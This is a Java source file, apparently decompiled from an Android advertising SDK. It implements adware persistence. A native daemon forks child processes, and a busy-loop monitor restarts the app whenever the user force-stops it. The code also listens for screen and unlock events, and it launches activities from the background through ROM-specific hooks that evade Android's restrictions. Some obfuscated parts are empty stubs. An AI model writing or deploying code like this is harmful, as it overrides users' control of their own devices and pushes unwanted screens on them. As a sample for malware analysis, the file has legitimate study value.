package defpackage;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Process;

import com.hm.ck.CkRomUtils;
import com.vi.daemon.DaemonNative;
import com.wolike.ads.AdsCallback;
import com.wolike.ads.AdsHelper;
import com.wolike.ads.AdsJobService;
import com.wolike.ads.AdsLog;
import com.wolike.ads.AdsReceiver;
import com.wolike.ads.ProcessHolder;
import com.wolike.ads.screenmonitor.ScreenMonitorHelper;
import com.wolike.ads.utils.RomUtil;
import com.wolike.start.ActivityUtils;

import java.io.File;

import mc.zcoszprmcis.kabwotl.mcrz;

public class lk {
    public LogConfiguration logConfiguration;
    public Context context;
    public CommonCallback commonCallback;
    public ok.screenMonitor screenMonitor;

    /* loaded from: classes.dex */
    public static final class LkHolder {
        @SuppressLint({"StaticFieldLeak"})
        public static lk INSTANCE = new lk(null);
    }

    /* loaded from: classes.dex */
    public class ForkChildRunnable implements Runnable {
        public ForkChildRunnable() {
        }

        @Override // java.lang.Runnable
        public void run() {
            lk lkVar = lk.this;
            lkVar.forkChild(lkVar.context);
        }
    }

    /* loaded from: classes.dex */
    public class PackageMonitorRunnable implements Runnable {

        /* loaded from: classes.dex */
        public class restartRunnable implements Runnable {
            public restartRunnable(PackageMonitorRunnable packageMonitorRunnable) {
            }

            @Override // java.lang.Runnable
            public void run() {
                DaemonNative.restartProcess();
            }
        }

        public PackageMonitorRunnable() {
        }

        @Override // java.lang.Runnable
        public void run() {
            Process.setThreadPriority(-2);
            AdsLog.d("startPackageMonitor");
            while (true) {
                try {
                    if ((lk.this.context.getPackageManager().getApplicationInfo(lk.this.context.getPackageName(), PackageManager.GET_META_DATA).flags & 2097152) != 0) {
                        DaemonNative.restartProcess();
                        for (int i2 = 0; i2 < 3; i2++) {
                            new Thread(new restartRunnable(this)).start();
                        }
                    }
                } catch (Throwable th) {
                    AdsLog.e("getApplicationInfo error", th);
                }
            }
        }
    }

    /* loaded from: classes.dex */
    public class ScreenMonitorImpl implements ok.screenMonitor {
        public ScreenMonitorImpl() {
        }

        @Override  
        public void onScreenMonitorTimer(boolean z) {
        }

        @Override  
        public void onScreenStatusChanged(boolean z) {
            if (!RomUtil.isOppo() || z) {
                lk.this.forkChild();
            }
        }
    }

    /* loaded from: classes.dex */
    public class lilil1liLi1lLL1l1l implements Runnable {
        public lilil1liLi1lLL1l1l(lk lkVar) {
        }

        @Override // java.lang.Runnable
        public void run() {
        }
    }

    public lk(ForkChildRunnable forkChildRunnable) {
        this();
    }

     public void forkChild() {
        new Thread(new lilil1liLi1lLL1l1l(this)).start();
    }

    private void deleteIndicatorFile() {
        for (String str : AdsHelper.getIndicatorFiles(this.context)) {
            if (str != null && new File(str).delete()) {
                AdsLog.d("delete indicatorFile success,file=" + str);
            }
        }
    }

    private void registerBroadcast() {
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.CLOSE_SYSTEM_DIALOGS");
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        intentFilter.addAction("android.intent.action.ACTION_SHUTDOWN");
        this.context.registerReceiver(new AdsReceiver(), intentFilter);
        AdsLog.d("register broadcast");
    }

    private boolean checkIsMiui() {
        return RomUtil.isMiui() && Build.VERSION.SDK_INT < 29;
    }

    private void startPackageMonitor() {
        if (checkIsMiui()) {
            new Thread(new PackageMonitorRunnable()).start();
        }
    }

    public static lk getInstance() {
        return LkHolder.INSTANCE;
    }

    public CommonCallback getCallback() {
        return this.commonCallback;
    }

    public LogConfiguration getConfig() {
        return this.logConfiguration;
    }

    public Context getContext() {
        return this.context;
    }

    public void init(Context context, LogConfiguration logConfigurationVar, AdsCallback commonCallbackVar) {
        this.context = context;
        this.logConfiguration = logConfigurationVar;
        this.commonCallback = commonCallbackVar;
        AdsLog.d("SyncManager DaemonManager init");
        ProcessHolder.init(context);
        AdsHelper.init(context);
        if (ProcessHolder.IS_MAIN) {
            deleteIndicatorFile();
        }
        if (ProcessHolder.isMainProcess(context) || ProcessHolder.IS_DAEMON) {
            registerBroadcast();
            startPackageMonitor();
            new Thread(new ForkChildRunnable()).start();
        }
        AdsHelper.startServices(context);
        if ((ProcessHolder.isMainProcess(context) || ProcessHolder.IS_SERVICE) && this.logConfiguration.isScreenMonitorEnable()) {
            if (ProcessHolder.isMainProcess(context)) {
                ok.getInstance().addCallback(this.screenMonitor);
            } else {
                ok.setQueryInterval(1000);
            }
            ScreenMonitorHelper.start();
        }
        AdsJobService.scheduleService(context);
    }

    public lk() {
        this.screenMonitor = new ScreenMonitorImpl();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void forkChild(Context context) {
        AdsLog.d("forkChild,context=" + context);
        String forkName = AdsHelper.getForkName();
        String selfForkLockFile = AdsHelper.getSelfForkLockFile(context);
        String selfForkWaitFile = AdsHelper.getSelfForkWaitFile(context);
        String selfForkIndicatorFile = AdsHelper.getSelfForkIndicatorFile(context);
        String selfForkWaitIndicatorFile = AdsHelper.getSelfForkWaitIndicatorFile(context);
        AdsLog.d("===============forkChild log start ==============");
        AdsLog.d("forkChild,forkName=" + forkName);
        AdsLog.d("forkChild,forkLockFile=" + selfForkLockFile);
        AdsLog.d("forkChild,forkWaitFile=" + selfForkWaitFile);
        AdsLog.d("forkChild,forkIndicatorFile=" + selfForkIndicatorFile);
        AdsLog.d("forkChild,forkWaitIndicatorFile=" + selfForkWaitIndicatorFile);
        AdsLog.d("===============forkChild log end==============");
        DaemonNative.forkChild(forkName, selfForkLockFile, selfForkWaitFile, selfForkIndicatorFile, selfForkWaitIndicatorFile);
    }


    public static void startActivity(Context context, Intent intent){
        if (ActivityUtils.isAppRunningForeground(context)){
            context.startActivity(intent);
            return;
        }
        int currentROM2 = CkRomUtils.getCurrentROM();
        if (currentROM2 == 4 ) {
            mcrz.a(context, intent);
        }else{
            ActivityUtils.hookJumpActivity(context,intent);
        }

    }
}